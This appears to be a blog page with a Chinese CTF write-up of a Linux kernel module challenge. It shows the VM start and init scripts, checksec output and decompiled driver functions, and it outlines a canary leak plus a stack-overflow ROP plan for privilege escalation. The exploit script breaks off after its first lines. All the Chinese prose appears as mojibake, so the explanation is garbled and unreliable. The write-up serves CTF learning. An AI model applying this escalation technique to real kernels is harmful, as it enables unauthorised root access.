<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="kernelropä¸çŸ¥é“ä¸ºå•¥ä»Šå¤©å¿½ç„¶å¾ˆç´¯ï¼ˆå¯èƒ½æ˜¯æ˜¨æ™šæ²¡ç¡å¥½ï¼Ÿï¼‰ï¼Œä¸æ€ä¹ˆæƒ³å­¦ä¹ ï¼Œä½†æƒ³èµ·æ¥è‡ªå·±çš„kernelpwnæ‰å…¥é—¨ä¸¤å¤©ï¼Œä¸èƒ½åœ¨è¿™ä¸ªæ—¶å€™é¢“åºŸï¼Œè¿˜æ˜¯æ’¸èµ·è¢–å­åŠ æ²¹å¹²å§ã€‚ ä»Šå¤©çœ‹kernelpwnçš„ç¬¬äºŒé“é¢˜ æ‰¾é¢˜æ‰¾äº†ä¸€ä¼šï¼Œå¿½ç„¶ç¿»åˆ°äº†ä¸€ä¸ªå¤§ä½¬çš„åšå®¢ï¼Œæ˜¯éœ€è¦ä»°æœ›çš„é‚£ç§ï¼Œå¾ˆå‰å®³å•Šã€‚ é¢˜ç›®åˆ†æè„šæœ¬åˆ†æå¯åŠ¨è„šæœ¬ 12345678910rootzhang@rootzhang-virtual-machine:~&#x2F;ke">
<meta property="og:type" content="article">
<meta property="og:title" content="kernelpwnç¬¬äºŒé“é¢˜">
<meta property="og:url" content="http://example.com/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/index.html">
<meta property="og:site_name" content="study">
<meta property="og:description" content="kernelropä¸çŸ¥é“ä¸ºå•¥ä»Šå¤©å¿½ç„¶å¾ˆç´¯ï¼ˆå¯èƒ½æ˜¯æ˜¨æ™šæ²¡ç¡å¥½ï¼Ÿï¼‰ï¼Œä¸æ€ä¹ˆæƒ³å­¦ä¹ ï¼Œä½†æƒ³èµ·æ¥è‡ªå·±çš„kernelpwnæ‰å…¥é—¨ä¸¤å¤©ï¼Œä¸èƒ½åœ¨è¿™ä¸ªæ—¶å€™é¢“åºŸï¼Œè¿˜æ˜¯æ’¸èµ·è¢–å­åŠ æ²¹å¹²å§ã€‚ ä»Šå¤©çœ‹kernelpwnçš„ç¬¬äºŒé“é¢˜ æ‰¾é¢˜æ‰¾äº†ä¸€ä¼šï¼Œå¿½ç„¶ç¿»åˆ°äº†ä¸€ä¸ªå¤§ä½¬çš„åšå®¢ï¼Œæ˜¯éœ€è¦ä»°æœ›çš„é‚£ç§ï¼Œå¾ˆå‰å®³å•Šã€‚ é¢˜ç›®åˆ†æè„šæœ¬åˆ†æå¯åŠ¨è„šæœ¬ 12345678910rootzhang@rootzhang-virtual-machine:~&#x2F;ke">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-11T13:52:11.000Z">
<meta property="article:modified_time" content="2022-02-11T13:52:36.742Z">
<meta property="article:author" content="rootzhang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>kernelpwnç¬¬äºŒé“é¢˜ | study</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">study</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          kernelpwnç¬¬äºŒé“é¢˜
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-02-11 21:52:11 / ä¿®æ”¹æ—¶é—´ï¼š21:52:36" itemprop="dateCreated datePublished" datetime="2022-02-11T21:52:11+08:00">2022-02-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="kernelrop"><a href="#kernelrop" class="headerlink" title="kernelrop"></a>kernelrop</h1><p>ä¸çŸ¥é“ä¸ºå•¥ä»Šå¤©å¿½ç„¶å¾ˆç´¯ï¼ˆå¯èƒ½æ˜¯æ˜¨æ™šæ²¡ç¡å¥½ï¼Ÿï¼‰ï¼Œä¸æ€ä¹ˆæƒ³å­¦ä¹ ï¼Œä½†æƒ³èµ·æ¥è‡ªå·±çš„kernelpwnæ‰å…¥é—¨ä¸¤å¤©ï¼Œä¸èƒ½åœ¨è¿™ä¸ªæ—¶å€™é¢“åºŸï¼Œè¿˜æ˜¯æ’¸èµ·è¢–å­åŠ æ²¹å¹²å§ã€‚</p>
<p>ä»Šå¤©çœ‹kernelpwnçš„ç¬¬äºŒé“é¢˜</p>
<p>æ‰¾é¢˜æ‰¾äº†ä¸€ä¼šï¼Œå¿½ç„¶ç¿»åˆ°äº†ä¸€ä¸ªå¤§ä½¬çš„åšå®¢ï¼Œæ˜¯éœ€è¦ä»°æœ›çš„é‚£ç§ï¼Œå¾ˆå‰å®³å•Šã€‚</p>
<h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><h3 id="è„šæœ¬åˆ†æ"><a href="#è„šæœ¬åˆ†æ" class="headerlink" title="è„šæœ¬åˆ†æ"></a>è„šæœ¬åˆ†æ</h3><p>å¯åŠ¨è„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kernelstudy/pwn2/give_to_player$ cat ./start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-appendé€‰é¡¹æ˜¯å¯åŠ¨æ—¶çš„é™„åŠ é€‰é¡¹ï¼Œâ€™quiet kaslrâ€™ä»£è¡¨å¯åŠ¨kaslrï¼Œå…¶ä»–çš„æˆ‘ä¹Ÿçœ‹ä¸æ‡‚ğŸ˜´</p>
<p>æ–‡ä»¶ç³»ç»Ÿçš„init</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br></pre></td></tr></table></figure>

<p>æœ‰å‡ è¡Œä¸èƒ½ç†è§£åšäº†åšä¸‹è®°å½•</p>
<p><strong>/proc/kallsyms</strong>:å¼€å‘è€…ä¸ºäº†æ–¹ä¾¿è°ƒè¯•å†…æ ¸ä»£ç ï¼Œå°†å†…æ ¸ä¸­çš„æ‰€æœ‰å‡½æ•°å’Œéæ ˆå˜é‡çš„åœ°å€æŠ½å–å‡ºæ¥ï¼Œå½¢æˆä¸€ä¸ªç¬¦å·è¡¨ï¼ˆç¬¦å·å¯¹åº”åœ°å€ï¼‰ï¼Œkallsymså°±èƒ½æŸ¥çœ‹è¿™ä¸ªç¬¦å·è¡¨ï¼Œ<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>å°±æ˜¯æŠŠ/proc/kallsymsä¿å­˜åˆ°tmp/kallsymsä¸­å».</p>
<p><strong>ktr_restrict&amp;dmesg_restrict</strong>:è¿™ä¸ªæ–‡ä»¶æ§åˆ¶æ˜¯å¦å¯ä»¥æ‰“å°å†…æ ¸åœ°å€ï¼Œå½“ä»–ç­‰äº0çš„æ—¶å€™æ˜¯å¯ä»¥ç›´æ¥é€šè¿‡kallsymsç›´æ¥æ‰“å°åœ°å€ï¼Œå½“ç­‰äº1çš„æ—¶å€™å°±ä¸èƒ½èƒ½ç›´æ¥æ‰“å°äº†ã€‚dmesg_restrictæ–‡ä»¶èƒ½å¤Ÿæ§åˆ¶dmesgå‘½ä»¤èƒ½å¦ç›´æ¥æ‰“å°å†…æ ¸ç¼“å­˜åŒºçš„å€¼ï¼Œå½“ä»–ä¸º1çš„æ—¶å€™dmesgå°±ä¸èƒ½ç›´æ¥æ‰“å°ã€‚ä¸¤ä¸ªå‘½ä»¤çš„ç»„åˆæ‹³å¯¼è‡´æ— æ³•ç›´æ¥/proc/kallsymsæŸ¥çœ‹å†…æ ¸åœ°å€ï¼Œä½†æ˜¯æ²¡æœ‰ç¦æ­¢/tmp/kallsymsã€‚</p>
<p><strong>poweroff -d 120 -f &amp;</strong>:è¿™æ˜¯å®šæ—¶å…³æœºçš„å‘½ä»¤ï¼Œç›´æ¥æ³¨é‡Šæ‰</p>
<p>é€šè¿‡initæ–‡ä»¶çš„æŸ¥çœ‹å¯ä»¥é”å®šcore.ko,é€šè¿‡checksecæŸ¥çœ‹ä¿æŠ¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/rootfs/core.cpio/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>å¯¹æ˜¨å¤©å…³äºå†…æ ¸ä¿æŠ¤å’Œç”¨æˆ·æ€ä¿æŠ¤æœ‰ä¸ªåˆæ­¥çš„çŒœæƒ³ï¼Œ.koæ–‡ä»¶ä¼°è®¡ä¸¤ä¸ªä¿æŠ¤éƒ½æœ‰ï¼Œå¯è§æœ‰canaryä¿æŠ¤å’Œnx.</p>
<h4 id="koæ–‡ä»¶åˆ†æ"><a href="#koæ–‡ä»¶åˆ†æ" class="headerlink" title=".koæ–‡ä»¶åˆ†æ"></a>.koæ–‡ä»¶åˆ†æ</h4><p><strong>init_module</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°æ˜¯æ¨¡å—è¢«åŠ è½½åˆ°å†…æ ¸çš„æ‰§è¡Œçš„ï¼Œproc_createå‡½æ•°çš„ä½œç”¨æ˜¯åœ¨procæ–‡ä»¶å¤¹åœ¨äº§ç”Ÿä¸€ä¸ªè™šæ‹Ÿçš„æ–‡ä»¶core,ç”¨æˆ·æ€å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å’Œæ¨¡å—é€šä¿¡äº†ã€‚</p>
<p><strong>core_ioctl</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®äº†ä¸‰æ¡å‘½ä»¤ï¼Œåˆ†åˆ«æ˜¯core_read()ï¼Œè®¾ç½®å…¨å±€å˜é‡off(æˆ‘çš„åˆ¤æ–­ï¼šä¸æ˜¯æ ˆç©ºé—´çš„å˜é‡å°±æ˜¯å…¨å±€å˜é‡)ï¼Œå’Œcore_copy_func().</p>
<p><strong>core_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠä»&amp;v5[off]å¼€å§‹æ‹·è´64ä¸ªå­—èŠ‚åˆ°ç”¨æˆ·æ€ã€‚offæˆ‘ä»¬å¯æ§ï¼Œé‚£å°±ä»£è¡¨ç€æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚<code>__asm &#123; swapgs &#125;</code>è¿™ä¸ªæ˜¯åˆ‡æ¢ç”¨æˆ·æ€å’Œå†…æ ¸æ€çš„æŒ‡ä»¤ã€‚</p>
<p><strong>core_copy_func</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŠŠå…¨å±€å˜é‡nameæ‹·è´a1ä¸ªå­—èŠ‚åˆ°v2,a1å¯ä»¥æ•´æ•°æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥æ ˆæº¢å‡ºäº†ã€‚</p>
<p><strong>core_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘name copyå¾ˆå¤šçš„å­—èŠ‚</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ€è·¯ï¼šå…ˆè®¾ç½®offçš„å€¼ï¼Œç„¶åé€šè¿‡core_read()å‡½æ•°leakå‡ºcanaryï¼Œç„¶åé€šè¿‡core_writeå‡½æ•°å‘nameå†™rop,ç„¶åé€šè¿‡coe_copy_funcå‡½æ•°æŠŠropç»™copyåˆ°æ ˆä¸Šæ‰§è¡Œropã€‚</p>
<p>è¿™æ˜¯æˆ‘çš„å¤§è‡´æ€è·¯ï¼ˆå®Œå…¨å€Ÿé‰´ï¼‰ï¼Œè‡³äºropæ€ä¹ˆæ„é€ æ€ä¹ˆææƒï¼Œæ€ä¹ˆè¿”å›ç”¨æˆ·æ€æ‰§è¡Œsystem(â€˜/bin/shâ€™)å‡½æ•°éƒ½è¿˜å¤§è‡´ä¸æ¸…æ¥šï¼Œç­‰æˆ‘æ…¢æ…¢é’»ç ”ã€‚</p>
<p>è¿™æ˜¯æˆ‘å¤åˆ»çš„è„šæœ¬ï¼Œå’Œwikiä¸Šçš„æŸ¥é‡ç‡åº”è¯¥èƒ½è¶…è¿‡ç™¾åˆ†ä¹‹70ï¼Œä½†å¥½åœ¨æ˜¯è‡ªå·±ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦æ•²çš„ï¼Œåœ¨å†™ï¼ˆæŠ„ï¼‰çš„è¿‡ç¨‹ä¸­ä¹ŸçŸ¥é“å¾ˆç†è§£äº†å¾ˆå¤šä¸œè¥¿ï¼Œä¹Ÿä¸å¾—ä¸æ„Ÿå¹cè¯­è¨€çš„å¼ºå¤§ï¼ˆæŒ‡é’ˆå’Œå†…å­˜æ§åˆ¶ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 